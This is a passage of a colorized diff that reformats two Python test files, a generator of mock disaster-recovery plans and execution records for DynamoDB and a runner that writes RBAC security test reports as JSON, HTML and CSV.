\"FAILED\"\u001b[0m\n\u001b[32m+            if with_errors and random.random() < 0.1\u001b[0m\n\u001b[32m+            else \"COMPLETED\",\u001b[0m\n             \"StartTime\": start_time + (i * 60),\n             \"EndTime\": start_time + (i * 60) + random.randint(60, 300),\n\u001b[31m-            \"ServerResults\": server_results\u001b[0m\n\u001b[32m+            \"ServerResults\": server_results,\u001b[0m\n         }\n         wave_statuses.append(wave_status)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     execution = {\n         \"ExecutionId\": execution_id,\n         \"PlanId\": plan_id,\n         \"Status\": status,\n         \"ExecutionType\": random.choice([\"RECOVERY\", \"DRILL\"]),\n\u001b[36m@@ -195,238 +216,242 @@\u001b[0m\n         \"StartTime\": start_time,\n         \"EndTime\": end_time,\n         \"WaveStatuses\": wave_statuses,\n         \"TotalServers\": wave_count * servers_per_wave,\n         \"SuccessfulServers\": sum(\n\u001b[31m-            1 for ws in wave_statuses \u001b[0m\n\u001b[31m-            for sr in ws[\"ServerResults\"] \u001b[0m\n\u001b[32m+            1\u001b[0m\n\u001b[32m+            for ws in wave_statuses\u001b[0m\n\u001b[32m+            for sr in ws[\"ServerResults\"]\u001b[0m\n             if sr[\"Status\"] == \"COMPLETED\"\n         ),\n         \"FailedServers\": sum(\n\u001b[31m-            1 for ws in wave_statuses \u001b[0m\n\u001b[31m-            for sr in ws[\"ServerResults\"] \u001b[0m\n\u001b[32m+            1\u001b[0m\n\u001b[32m+            for ws in wave_statuses\u001b[0m\n\u001b[32m+            for sr in ws[\"ServerResults\"]\u001b[0m\n             if sr[\"Status\"] == \"FAILED\"\n\u001b[31m-        )\u001b[0m\n\u001b[32m+        ),\u001b[0m\n     }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     if with_errors:\n         execution[\"Errors\"] = [\n             {\n                 \"WaveNumber\": ws[\"WaveNumber\"],\n                 \"ServerId\": sr[\"ServerId\"],\n\u001b[31m-                \"ErrorMessage\": sr[\"ErrorMessage\"]\u001b[0m\n\u001b[32m+                \"ErrorMessage\": sr[\"ErrorMessage\"],\u001b[0m\n             }\n             for ws in wave_statuses\n             for sr in ws[\"ServerResults\"]\n             if sr[\"ErrorMessage\"]\n         ]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return execution\n \n \n def generate_multiple_executions(\n     count: int,\n     plan_id: Optional[str] = None,\n\u001b[31m-    status_distribution: Optional[Dict[str, float]] = None\u001b[0m\n\u001b[32m+    status_distribution: Optional[Dict[str, float]] = None,\u001b[0m\n ) -> List[Dict[str, Any]]:\n     \"\"\"\n     Generate multiple execution history records.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Args:\n         count: Number of executions to generate\n         plan_id: Optional plan ID to use for all executions\n         status_distribution: Distribution of statuses (e.g., {\"COMPLETED\": 0.7, \"FAILED\": 0.3})\n                            If None, uses default distribution\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         List of execution history records\n     \"\"\"\n     if plan_id is None:\n         plan_id = f\"plan-{uuid.uuid4().hex[:12]}\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     if status_distribution is None:\n         status_distribution = {\n             \"COMPLETED\": 0.7,\n             \"FAILED\": 0.2,\n             \"RUNNING\": 0.05,\n\u001b[31m-            \"CANCELLED\": 0.05\u001b[0m\n\u001b[32m+            \"CANCELLED\": 0.05,\u001b[0m\n         }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Create weighted list of statuses\n     statuses = []\n     for status, weight in status_distribution.items():\n         statuses.extend([status] * int(weight * 100))\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     executions = []\n     for _ in range(count):\n         status = random.choice(statuses)\n         with_errors = status == \"FAILED\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         execution = generate_execution_history(\n             plan_id=plan_id,\n             status=status,\n             wave_count=random.randint(1, 5),\n             servers_per_wave=random.randint(1, 4),\n\u001b[31m-            with_errors=with_errors\u001b[0m\n\u001b[32m+            with_errors=with_errors,\u001b[0m\n         )\n         executions.append(execution)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return executions\n \n \n def generate_protection_group(\n\u001b[31m-    group_id: Optional[str] = None,\u001b[0m\n\u001b[31m-    server_count: int = 5\u001b[0m\n\u001b[32m+    group_id: Optional[str] = None, server_count: int = 5\u001b[0m\n ) -> Dict[str, Any]:\n     \"\"\"\n     Generate a protection group for testing.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Args:\n         group_id: Optional group ID. If None, generates random ID\n         server_count: Number of servers in the group\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         Dictionary representing a protection group\n     \"\"\"\n     if group_id is None:\n         group_id = f\"pg-{uuid.uuid4().hex[:12]}\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return {\n         \"GroupId\": group_id,\n         \"GroupName\": f\"Protection Group {group_id}\",\n         \"Description\": f\"Generated protection group with {server_count} servers\",\n         \"ServerIds\": generate_server_ids(server_count),\n         \"Region\": \"us-east-1\",\n         \"AccountId\": \"123456789012\",\n         \"Tags\": {\n\u001b[31m-            \"Environment\": random.choice([\"Production\", \"Staging\", \"Development\"]),\u001b[0m\n\u001b[31m-            \"Application\": random.choice([\"WebApp\", \"Database\", \"API\"])\u001b[0m\n\u001b[32m+            \"Environment\": random.choice(\u001b[0m\n\u001b[32m+                [\"Production\", \"Staging\", \"Development\"]\u001b[0m\n\u001b[32m+            ),\u001b[0m\n\u001b[32m+            \"Application\": random.choice([\"WebApp\", \"Database\", \"API\"]),\u001b[0m\n         },\n         \"CreatedDate\": int(time.time()),\n\u001b[31m-        \"LastModifiedDate\": int(time.time())\u001b[0m\n\u001b[32m+        \"LastModifiedDate\": int(time.time()),\u001b[0m\n     }\n \n \n\u001b[31m-def generate_random_string(length: int = 10, include_special: bool = False) -> str:\u001b[0m\n\u001b[32m+def generate_random_string(\u001b[0m\n\u001b[32m+    length: int = 10, include_special: bool = False\u001b[0m\n\u001b[32m+) -> str:\u001b[0m\n     \"\"\"\n     Generate a random string.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Args:\n         length: Length of the string\n         include_special: Whether to include special characters\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         Random string\n     \"\"\"\n     chars = string.ascii_letters + string.digits\n     if include_special:\n         chars += \"!@#$%^&*()-_=+[]{}|;:,.<>?\"\n\u001b[31m-    \u001b[0m\n\u001b[31m-    return ''.join(random.choices(chars, k=length))\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    return \"\".join(random.choices(chars, k=length))\u001b[0m\n \n \n def generate_account_id() -> str:\n     \"\"\"\n     Generate a random AWS account ID (12 digits).\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         12-digit account ID string\n     \"\"\"\n\u001b[31m-    return ''.join(random.choices(string.digits, k=12))\u001b[0m\n\u001b[32m+    return \"\".join(random.choices(string.digits, k=12))\u001b[0m\n \n \n def generate_instance_id() -> str:\n     \"\"\"\n     Generate a random EC2 instance ID in format: i-{17 hex chars}\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         Instance ID string (e.g., \"i-0123456789abcdef0\")\n     \"\"\"\n\u001b[31m-    hex_chars = ''.join(random.choices('0123456789abcdef', k=17))\u001b[0m\n\u001b[32m+    hex_chars = \"\".join(random.choices(\"0123456789abcdef\", k=17))\u001b[0m\n     return f\"i-{hex_chars}\"\n \n \n def generate_job_id() -> str:\n     \"\"\"\n     Generate a random DRS job ID in format: job-{16 hex chars}\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         Job ID string\n     \"\"\"\n\u001b[31m-    hex_chars = ''.join(random.choices('0123456789abcdef', k=16))\u001b[0m\n\u001b[32m+    hex_chars = \"\".join(random.choices(\"0123456789abcdef\", k=16))\u001b[0m\n     return f\"job-{hex_chars}\"\n \n \n def seed_database_with_plans(\n     dynamodb_table,\n     count: int = 10,\n     wave_range: tuple = (1, 5),\n\u001b[31m-    servers_per_wave_range: tuple = (1, 4)\u001b[0m\n\u001b[32m+    servers_per_wave_range: tuple = (1, 4),\u001b[0m\n ) -> List[Dict[str, Any]]:\n     \"\"\"\n     Seed DynamoDB table with random recovery plans.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Args:\n         dynamodb_table: DynamoDB table resource\n         count: Number of plans to generate\n         wave_range: Tuple of (min_waves, max_waves)\n         servers_per_wave_range: Tuple of (min_servers, max_servers)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         List of generated plans\n     \"\"\"\n     plans = []\n     for _ in range(count):\n         wave_count = random.randint(*wave_range)\n         servers_per_wave = random.randint(*servers_per_wave_range)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         plan = generate_recovery_plan(\n\u001b[31m-            wave_count=wave_count,\u001b[0m\n\u001b[31m-            servers_per_wave=servers_per_wave\u001b[0m\n\u001b[32m+            wave_count=wave_count, servers_per_wave=servers_per_wave\u001b[0m\n         )\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Write to DynamoDB\n         dynamodb_table.put_item(Item=plan)\n         plans.append(plan)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return plans\n \n \n def seed_database_with_executions(\n\u001b[31m-    dynamodb_table,\u001b[0m\n\u001b[31m-    count: int = 100,\u001b[0m\n\u001b[31m-    plan_ids: Optional[List[str]] = None\u001b[0m\n\u001b[32m+    dynamodb_table, count: int = 100, plan_ids: Optional[List[str]] = None\u001b[0m\n ) -> List[Dict[str, Any]]:\n     \"\"\"\n     Seed DynamoDB table with random execution history records.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Args:\n         dynamodb_table: DynamoDB table resource\n         count: Number of execution records to generate\n         plan_ids: Optional list of plan IDs to use. If None, generates random plan IDs\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         List of generated execution records\n     \"\"\"\n     if plan_ids is None:\n\u001b[31m-        plan_ids = [f\"plan-{uuid.uuid4().hex[:12]}\" for _ in range(count // 10)]\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        plan_ids = [\u001b[0m\n\u001b[32m+            f\"plan-{uuid.uuid4().hex[:12]}\" for _ in range(count // 10)\u001b[0m\n\u001b[32m+        ]\u001b[0m\n\u001b[32m+\u001b[0m\n     executions = []\n     for _ in range(count):\n         plan_id = random.choice(plan_ids)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         execution = generate_execution_history(\n             plan_id=plan_id,\n             wave_count=random.randint(1, 5),\n             servers_per_wave=random.randint(1, 4),\n\u001b[31m-            with_errors=random.random() < 0.2  # 20% with errors\u001b[0m\n\u001b[32m+            with_errors=random.random() < 0.2,  # 20% with errors\u001b[0m\n         )\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Write to DynamoDB\n         dynamodb_table.put_item(Item=execution)\n         executions.append(execution)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return executions\n \n \n # Convenience functions for common scenarios\n def generate_simple_plan() -> Dict[str, Any]:\n\u001b[36m@@ -435,29 +460,27 @@\u001b[0m\n \n \n def generate_complex_plan() -> Dict[str, Any]:\n     \"\"\"Generate a complex 5-wave plan with dependencies.\"\"\"\n     return generate_recovery_plan(\n\u001b[31m-        wave_count=5,\u001b[0m\n\u001b[31m-        servers_per_wave=3,\u001b[0m\n\u001b[31m-        with_dependencies=True\u001b[0m\n\u001b[32m+        wave_count=5, servers_per_wave=3, with_dependencies=True\u001b[0m\n     )\n \n \n def generate_parallel_plan() -> Dict[str, Any]:\n     \"\"\"Generate a plan with all parallel waves.\"\"\"\n     return generate_recovery_plan(\n         wave_count=3,\n         servers_per_wave=4,\n         execution_types=[\"PARALLEL\"] * 3,\n\u001b[31m-        with_dependencies=False\u001b[0m\n\u001b[32m+        with_dependencies=False,\u001b[0m\n     )\n \n \n def generate_sequential_plan() -> Dict[str, Any]:\n     \"\"\"Generate a plan with all sequential waves.\"\"\"\n     return generate_recovery_plan(\n         wave_count=3,\n         servers_per_wave=2,\n         execution_types=[\"SEQUENTIAL\"] * 3,\n\u001b[31m-        with_dependencies=True\u001b[0m\n\u001b[32m+        with_dependencies=True,\u001b[0m\n     )\n\u001b[1m--- tests/security/run_security_tests.py\t2025-12-31 16:41:48.411263+00:00\u001b[0m\n\u001b[1m+++ tests/security/run_security_tests.py\t2026-01-02 15:49:03.702244+00:00\u001b[0m\n\u001b[36m@@ -23,27 +23,32 @@\u001b[0m\n # Add the current directory to Python path\n sys.path.append(str(Path(__file__).parent))\n \n from rbac_security_tests import RBACSecurityTester, RiskLevel, TestStatus\n \n\u001b[32m+\u001b[0m\n # Custom JSON encoder to handle enums\n class SecurityReportEncoder(json.JSONEncoder):\n     def default(self, obj):\n         if isinstance(obj, (RiskLevel, TestStatus)):\n             return obj.value\n         return super().default(obj)\n \n\u001b[32m+\u001b[0m\n def setup_logging(log_level: str = \"INFO\"):\n     \"\"\"Setup logging configuration\"\"\"\n     logging.basicConfig(\n         level=getattr(logging, log_level.upper()),\n\u001b[31m-        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',\u001b[0m\n\u001b[32m+        format=\"%(asctime)s - %(name)s - %(levelname)s - %(message)s\",\u001b[0m\n         handlers=[\n             logging.StreamHandler(sys.stdout),\n\u001b[31m-            logging.FileHandler(f'security_test_{datetime.now().strftime(\"%Y%m%d_%H%M%S\")}.log')\u001b[0m\n\u001b[31m-        ]\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[32m+            logging.FileHandler(\u001b[0m\n\u001b[32m+                f'security_test_{datetime.now().strftime(\"%Y%m%d_%H%M%S\")}.log'\u001b[0m\n\u001b[32m+            ),\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n \n def generate_html_report(report_data: dict, output_file: str):\n     \"\"\"Generate HTML security report\"\"\"\n     html_template = \"\"\"\n <!DOCTYPE html>\n\u001b[36m@@ -188,14 +193,16 @@\u001b[0m\n </html>\n     \"\"\"\n \n     # Process findings for HTML\n     findings_html = \"\"\n\u001b[31m-    for risk_level in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:\u001b[0m\n\u001b[31m-        findings = report_data.get('findings_by_risk', {}).get(risk_level, [])\u001b[0m\n\u001b[32m+    for risk_level in [\"CRITICAL\", \"HIGH\", \"MEDIUM\", \"LOW\"]:\u001b[0m\n\u001b[32m+        findings = report_data.get(\"findings_by_risk\", {}).get(risk_level, [])\u001b[0m\n         if findings:\n\u001b[31m-            findings_html += f\"<h3>{risk_level} Risk Findings ({len(findings)})</h3>\"\u001b[0m\n\u001b[32m+            findings_html += (\u001b[0m\n\u001b[32m+                f\"<h3>{risk_level} Risk Findings ({len(findings)})</h3>\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             for finding in findings:\n                 risk_class = f\"finding-{risk_level.lower()}\"\n                 findings_html += f\"\"\"\n                 <div class=\"finding {risk_class}\">\n                     <div class=\"finding-title\">{finding['title']}</div>\n\u001b[36m@@ -208,201 +215,260 @@\u001b[0m\n                 </div>\n                 \"\"\"\n \n     # Process recommendations for HTML\n     recommendations_html = \"\"\n\u001b[31m-    for rec in report_data.get('recommendations', []):\u001b[0m\n\u001b[32m+    for rec in report_data.get(\"recommendations\", []):\u001b[0m\n         priority_class = f\"priority-{rec['priority'].lower()}\"\n\u001b[31m-        actions_html = \"<ul>\" + \"\".join([f\"<li>{action}</li>\" for action in rec['actions']]) + \"</ul>\"\u001b[0m\n\u001b[32m+        actions_html = (\u001b[0m\n\u001b[32m+            \"<ul>\"\u001b[0m\n\u001b[32m+            + \"\".join([f\"<li>{action}</li>\" for action in rec[\"actions\"]])\u001b[0m\n\u001b[32m+            + \"</ul>\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         recommendations_html += f\"\"\"\n         <div class=\"recommendation {priority_class}\">\n             <h3>{rec['title']} ({rec['priority']} Priority)</h3>\n             <p>{rec['description']}</p>\n             <strong>Actions:</strong>\n             {actions_html}\n         </div>\n         \"\"\"\n \n     # Determine compliance class\n\u001b[31m-    compliance_status = report_data['compliance_status']['overall_status']\u001b[0m\n\u001b[31m-    compliance_class = \"compliant\" if compliance_status == \"COMPLIANT\" else \"non-compliant\"\u001b[0m\n\u001b[32m+    compliance_status = report_data[\"compliance_status\"][\"overall_status\"]\u001b[0m\n\u001b[32m+    compliance_class = (\u001b[0m\n\u001b[32m+        \"compliant\" if compliance_status == \"COMPLIANT\" else \"non-compliant\"\u001b[0m\n\u001b[32m+    )\u001b[0m\n \n     # Format the HTML\n     html_content = html_template.format(\n\u001b[31m-        timestamp=report_data['metadata']['timestamp'],\u001b[0m\n\u001b[31m-        session_id=report_data['metadata']['test_session_id'],\u001b[0m\n\u001b[31m-        total_tests=report_data['executive_summary']['total_tests'],\u001b[0m\n\u001b[31m-        success_rate=report_data['executive_summary']['success_rate'],\u001b[0m\n\u001b[31m-        critical_findings=report_data['executive_summary']['critical_findings'],\u001b[0m\n\u001b[31m-        high_findings=report_data['executive_summary']['high_findings'],\u001b[0m\n\u001b[31m-        medium_findings=report_data['executive_summary']['medium_findings'],\u001b[0m\n\u001b[31m-        low_findings=report_data['executive_summary']['low_findings'],\u001b[0m\n\u001b[32m+        timestamp=report_data[\"metadata\"][\"timestamp\"],\u001b[0m\n\u001b[32m+        session_id=report_data[\"metadata\"][\"test_session_id\"],\u001b[0m\n\u001b[32m+        total_tests=report_data[\"executive_summary\"][\"total_tests\"],\u001b[0m\n\u001b[32m+        success_rate=report_data[\"executive_summary\"][\"success_rate\"],\u001b[0m\n\u001b[32m+        critical_findings=report_data[\"executive_summary\"][\u001b[0m\n\u001b[32m+            \"critical_findings\"\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+        high_findings=report_data[\"executive_summary\"][\"high_findings\"],\u001b[0m\n\u001b[32m+        medium_findings=report_data[\"executive_summary\"][\"medium_findings\"],\u001b[0m\n\u001b[32m+        low_findings=report_data[\"executive_summary\"][\"low_findings\"],\u001b[0m\n         compliance_status=compliance_status,\n\u001b[31m-        compliance_score=report_data['compliance_status']['compliance_score'],\u001b[0m\n\u001b[32m+        compliance_score=report_data[\"compliance_status\"][\"compliance_score\"],\u001b[0m\n         compliance_class=compliance_class,\n         recommendations_html=recommendations_html,\n         findings_html=findings_html,\n\u001b[31m-        roles_tested=len(report_data['test_coverage']['roles_tested']),\u001b[0m\n\u001b[31m-        permissions_tested=len(report_data['test_coverage']['permissions_tested'])\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-\u001b[0m\n\u001b[31m-    with open(output_file, 'w') as f:\u001b[0m\n\u001b[32m+        roles_tested=len(report_data[\"test_coverage\"][\"roles_tested\"]),\u001b[0m\n\u001b[32m+        permissions_tested=len(\u001b[0m\n\u001b[32m+            report_data[\"test_coverage\"][\"permissions_tested\"]\u001b[0m\n\u001b[32m+        ),\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    with open(output_file, \"w\") as f:\u001b[0m\n         f.write(html_content)\n\u001b[32m+\u001b[0m\n \n def generate_csv_report(report_data: dict, output_file: str):\n     \"\"\"Generate CSV compliance matrix\"\"\"\n     import csv\n\u001b[31m-    \u001b[0m\n\u001b[31m-    with open(output_file, 'w', newline='') as csvfile:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    with open(output_file, \"w\", newline=\"\") as csvfile:\u001b[0m\n         writer = csv.writer(csvfile)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Write header\n\u001b[31m-        writer.writerow([\u001b[0m\n\u001b[31m-            'Test ID', 'Title', 'Risk Level', 'Status', 'Affected Roles', \u001b[0m\n\u001b[31m-            'Description', 'Remediation', 'Timestamp'\u001b[0m\n\u001b[31m-        ])\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        writer.writerow(\u001b[0m\n\u001b[32m+            [\u001b[0m\n\u001b[32m+                \"Test ID\",\u001b[0m\n\u001b[32m+                \"Title\",\u001b[0m\n\u001b[32m+                \"Risk Level\",\u001b[0m\n\u001b[32m+                \"Status\",\u001b[0m\n\u001b[32m+                \"Affected Roles\",\u001b[0m\n\u001b[32m+                \"Description\",\u001b[0m\n\u001b[32m+                \"Remediation\",\u001b[0m\n\u001b[32m+                \"Timestamp\",\u001b[0m\n\u001b[32m+            ]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         # Write findings\n\u001b[31m-        for finding in report_data.get('detailed_findings', []):\u001b[0m\n\u001b[31m-            writer.writerow([\u001b[0m\n\u001b[31m-                finding['test_id'],\u001b[0m\n\u001b[31m-                finding['title'],\u001b[0m\n\u001b[31m-                finding['risk_level'],\u001b[0m\n\u001b[31m-                finding['status'],\u001b[0m\n\u001b[31m-                ', '.join(finding['affected_roles']),\u001b[0m\n\u001b[31m-                finding['description'],\u001b[0m\n\u001b[31m-                finding['remediation'],\u001b[0m\n\u001b[31m-                finding['timestamp']\u001b[0m\n\u001b[31m-            ])\u001b[0m\n\u001b[32m+        for finding in report_data.get(\"detailed_findings\", []):\u001b[0m\n\u001b[32m+            writer.writerow(\u001b[0m\n\u001b[32m+                [\u001b[0m\n\u001b[32m+                    finding[\"test_id\"],\u001b[0m\n\u001b[32m+                    finding[\"title\"],\u001b[0m\n\u001b[32m+                    finding[\"risk_level\"],\u001b[0m\n\u001b[32m+                    finding[\"status\"],\u001b[0m\n\u001b[32m+                    \", \".join(finding[\"affected_roles\"]),\u001b[0m\n\u001b[32m+                    finding[\"description\"],\u001b[0m\n\u001b[32m+                    finding[\"remediation\"],\u001b[0m\n\u001b[32m+                    finding[\"timestamp\"],\u001b[0m\n\u001b[32m+                ]\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n \n async def main():\n     \"\"\"Main execution function\"\"\"\n\u001b[31m-    parser = argparse.ArgumentParser(description='Run RBAC Security Tests')\u001b[0m\n\u001b[31m-    parser.add_argument('--config', default='tests/security/config.json', \u001b[0m\n\u001b[31m-                       help='Configuration file path')\u001b[0m\n\u001b[31m-    parser.add_argument('--output-dir', default='tests/security/reports', \u001b[0m\n\u001b[31m-                       help='Output directory for reports')\u001b[0m\n\u001b[31m-    parser.add_argument('--log-level', default='INFO', \u001b[0m\n\u001b[31m-                       choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],\u001b[0m\n\u001b[31m-                       help='Logging level')\u001b[0m\n\u001b[31m-    parser.add_argument('--no-cleanup', action='store_true',\u001b[0m\n\u001b[31m-                       help='Skip cleanup of test users (for debugging)')\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    parser = argparse.ArgumentParser(description=\"Run RBAC Security Tests\")\u001b[0m\n\u001b[32m+    parser.add_argument(\u001b[0m\n\u001b[32m+        \"--config\",\u001b[0m\n\u001b[32m+        default=\"tests/security/config.json\",\u001b[0m\n\u001b[32m+        help=\"Configuration file path\",\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+    parser.add_argument(\u001b[0m\n\u001b[32m+        \"--output-dir\",\u001b[0m\n\u001b[32m+        default=\"tests/security/reports\",\u001b[0m\n\u001b[32m+        help=\"Output directory for reports\",\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+    parser.add_argument(\u001b[0m\n\u001b[32m+        \"--log-level\",\u001b[0m\n\u001b[32m+        default=\"INFO\",\u001b[0m\n\u001b[32m+        choices=[\"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\"],\u001b[0m\n\u001b[32m+        help=\"Logging level\",\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+    parser.add_argument(\u001b[0m\n\u001b[32m+        \"--no-cleanup\",\u001b[0m\n\u001b[32m+        action=\"store_true\",\u001b[0m\n\u001b[32m+        help=\"Skip cleanup of test users (for debugging)\",\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     args = parser.parse_args()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Setup logging\n     setup_logging(args.log_level)\n     logger = logging.getLogger(__name__)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Create output directory\n     output_dir = Path(args.output_dir)\n     output_dir.mkdir(parents=True, exist_ok=True)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     logger.info(\"Starting RBAC Security Testing Framework\")\n     logger.info(f\"Configuration: {args.config}\")\n     logger.info(f\"Output Directory: {args.output_dir}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     try:\n         # Initialize tester\n         tester = RBACSecurityTester(args.config)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Setup test environment\n         logger.info(\"Setting up test environment...\")\n         if not await tester.setup_test_environment():\n             logger.error(\"Failed to setup test environment\")\n             return 1\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Run security tests\n         logger.info(\"Running comprehensive security tests...\")\n         findings = await tester.run_security_tests()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Generate reports\n         logger.info(\"Generating security reports...\")\n         report = tester.generate_security_report()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Save JSON report\n         timestamp = datetime.now().strftime(\"%Y%m%d_%H%M%S\")\n         json_file = output_dir / f\"security_report_{timestamp}.json\"\n\u001b[31m-        with open(json_file, 'w') as f:\u001b[0m\n\u001b[32m+        with open(json_file, \"w\") as f:\u001b[0m\n             json.dump(report, f, indent=2, cls=SecurityReportEncoder)\n         logger.info(f\"JSON report saved: {json_file}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Generate HTML report\n         html_file = output_dir / f\"security_report_{timestamp}.html\"\n         generate_html_report(report, str(html_file))\n         logger.info(f\"HTML report saved: {html_file}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Generate CSV report\n         csv_file = output_dir / f\"compliance_matrix_{timestamp}.csv\"\n         generate_csv_report(report, str(csv_file))\n         logger.info(f\"CSV report saved: {csv_file}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Print executive summary\n\u001b[31m-        print(\"\\n\" + \"=\"*80)\u001b[0m\n\u001b[32m+        print(\"\\n\" + \"=\" * 80)\u001b[0m\n         print(\"\ud83d\udd12 RBAC SECURITY TEST EXECUTIVE SUMMARY\")\n\u001b[31m-        print(\"=\"*80)\u001b[0m\n\u001b[32m+        print(\"=\" * 80)\u001b[0m\n         print(f\"Test Session ID: {report['metadata']['test_session_id']}\")\n         print(f\"Timestamp: {report['metadata']['timestamp']}\")\n         print(f\"Environment: {report['metadata']['test_environment']}\")\n         print()\n         print(\"\ud83d\udcca TEST RESULTS:\")\n\u001b[31m-        print(f\"  Total Tests Executed: {report['executive_summary']['total_tests']}\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"  Total Tests Executed: {report['executive_summary']['total_tests']}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         print(f\"  Tests Passed: {report['executive_summary']['passed_tests']}\")\n         print(f\"  Tests Failed: {report['executive_summary']['failed_tests']}\")\n         print(f\"  Test Errors: {report['executive_summary']['error_tests']}\")\n\u001b[31m-        print(f\"  Success Rate: {report['executive_summary']['success_rate']:.1f}%\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"  Success Rate: {report['executive_summary']['success_rate']:.1f}%\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         print()\n         print(\"\ud83d\udea8 SECURITY FINDINGS:\")\n\u001b[31m-        print(f\"  Critical Risk: {report['executive_summary']['critical_findings']}\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"  Critical Risk: {report['executive_summary']['critical_findings']}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         print(f\"  High Risk: {report['executive_summary']['high_findings']}\")\n\u001b[31m-        print(f\"  Medium Risk: {report['executive_summary']['medium_findings']}\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"  Medium Risk: {report['executive_summary']['medium_findings']}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         print(f\"  Low Risk: {report['executive_summary']['low_findings']}\")\n         print()\n         print(\"\u2705 COMPLIANCE STATUS:\")\n\u001b[31m-        print(f\"  Overall Status: {report['compliance_status']['overall_status']}\")\u001b[0m\n\u001b[31m-        print(f\"  Compliance Score: {report['compliance_status']['compliance_score']:.1f}%\")\u001b[0m\n\u001b[31m-        print(f\"  AWS Security Standards: {report['compliance_status']['standards']['AWS_Security_Standards']}\")\u001b[0m\n\u001b[31m-        print(f\"  Least Privilege Principle: {report['compliance_status']['standards']['Least_Privilege_Principle']}\")\u001b[0m\n\u001b[31m-        print(f\"  Defense in Depth: {report['compliance_status']['standards']['Defense_in_Depth']}\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"  Overall Status: {report['compliance_status']['overall_status']}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"  Compliance Score: 